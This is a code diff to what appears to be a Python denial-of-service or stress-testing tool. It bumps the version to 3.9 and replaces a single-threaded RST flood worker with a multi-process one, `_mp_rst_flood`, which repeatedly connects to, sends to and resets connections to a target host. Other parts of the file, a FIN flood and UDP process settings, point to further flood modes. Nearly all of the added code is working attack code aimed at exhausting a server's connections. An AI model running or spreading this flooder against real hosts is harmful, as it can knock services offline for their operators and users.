@@ -25,7 +25,7 @@ from h2.connection import H2Connection
 from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 
-VERSION = "3.8"
+VERSION = "3.9"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -526,18 +526,48 @@ def _open_rst_sock(host, port):
     s.connect((host, port))
     return s
 
+def _mp_rst_flood(args_tuple):
+    """Multi-process RST flooder: connect, send, close (RST)."""
+    host, port, duration, payload = args_tuple
+    import time as _time
+    conns = 0
+    errors = 0
+    end = _time.time() + duration
+    while _time.time() < end:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2.0)
+            s.connect((host, port))
+            s.send(payload)
+            s.close()
+            conns += 1
+        except Exception:
+            errors += 1
+    return conns, errors
+
 async def rst_worker(name, url, stats, duration, stop, payload_size=1):
     host, port = parse_ip_port(url)
     payload = b"X" * max(1, payload_size)
+    n_procs = _UDP_NPROCS[0]
+    
+    import multiprocessing as mp
+    ctx = mp.get_context('spawn')
+    targets = [(host, port, duration, payload)] * n_procs
+    pool = ctx.Pool(n_procs)
+    async_result = pool.map_async(_mp_rst_flood, targets)
+    
     loop = asyncio.get_event_loop()
-    while not stop.is_set():
-        try:
-            s = await loop.run_in_executor(None, _open_rst_sock, host, port)
-            stats.conns += 1
-            s.send(payload)
-            s.close()  # SO_LINGER(0,0) → RST
-        except Exception:
-            stats.errors += 1
+    try:
+        results = await loop.run_in_executor(None, async_result.get, duration + 5)
+    except Exception:
+        results = [(0, 0)] * n_procs
+    finally:
+        pool.terminate()
+        pool.join()
+    
+    for conns, errs in results:
+        stats.conns += conns
+        stats.errors += errs
 
 # ── FIN flood: connect → graceful close (FIN) ────────────────────
 def _open_fin_sock(host, port):
